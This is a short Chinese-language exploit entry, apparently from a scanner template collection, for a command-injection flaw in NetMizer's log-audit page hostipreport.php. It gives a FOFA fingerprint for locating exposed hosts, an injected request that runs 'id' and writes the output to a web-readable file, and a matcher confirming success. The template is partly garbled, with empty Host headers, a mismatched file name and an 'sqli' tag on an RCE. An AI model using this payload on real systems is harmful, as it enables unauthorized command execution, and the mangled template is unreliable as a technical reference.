# NetMizer日志审计hostipreport.php存在rce漏洞

- **系统**：NetMizer　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="NetMizer 日志管理系统"`
- **请求**：`GET /data/yxproject/hostipreport.php?action=showtask&id=;id>test123.txt; HTTP/1.1`
- **关键头**：`id: netmizer-rzsj-hostipreport-rce`　`name: netmizer-rzsj-hostipreport-rce`　`author: unknow`　`severity: high`　`description: netmizer-rzsj-hostipreport-rce`　`tags: netmizer, sqli`　`fofa-query: title=NetMizer 日志管理系统`　`verified: true`

**请求体 / payload**
```
写入test123.txt
Host:
访问得到结果
GET /data/yxproject/test123.txt HTTP/1.1
Host:
- raw:
-
Host:
-
GET /data/yxproject/2333333333.txt HTTP/1.1
Host:
matchers:
- type: dsl
dsl:
- "status_code_2==200 && contains_all(body, 'uid=')"
```
- **预期**：200　|　—